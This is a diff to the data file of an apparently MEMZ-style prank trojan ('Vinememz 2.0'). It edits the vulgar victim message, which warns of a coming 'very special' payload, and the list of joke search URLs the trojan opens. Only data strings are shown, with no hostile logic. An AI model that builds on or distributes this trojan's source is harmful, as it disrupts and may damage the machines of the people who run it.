@@ -1,14 +1,15 @@
 #include "data.h"
 
-const unsigned char msg[] = "Thanks Joel for showing my trojan on stream!\r\n\r\nPlease wait some time until the last payload activates, which is a very special one.";
+const unsigned char msg[] = "You have been F U C K E D by Vinememz 2.0.\r\n\r\nPlease wait some time until the last payload activates, which is a very special one.";
 
 char *sites[] = {
 	"http://google.co.ck/search?q=pussy+destroyer",
-	"%1cortana+is+the+new+bonzi",
+	"%1what+are+these+strawberries+doing+on+my+nipples+i+need+them+for+the+fruit+salad",
 	"%1animated+christmas+tree+for+desktop",
 	"%1mp3+midi+converter",
 	"%1smileystoolbar+download",
 	"%1how+to+get+cursormania+in+2016",
+	"%1free+robux",
 	"%1preventon+antivirus+download",
 	"%1limp+bizkit+mp3+download",
 	"%1is+bonzi+buddy+a+virus",
@@ -28,7 +29,7 @@ char *sites[] = {
 	"%1john+cena+midi+legit+not+converted",
 	"%1skrillex+scay+onster+an+nice+sprites+midi",
 	"%1snow+halation+midi",
-	"http://pcoptimizerpro.com",
+	"https://www.protegent360.com/protegent-anti-virus.html",
 };
 
 char *engines[] = {
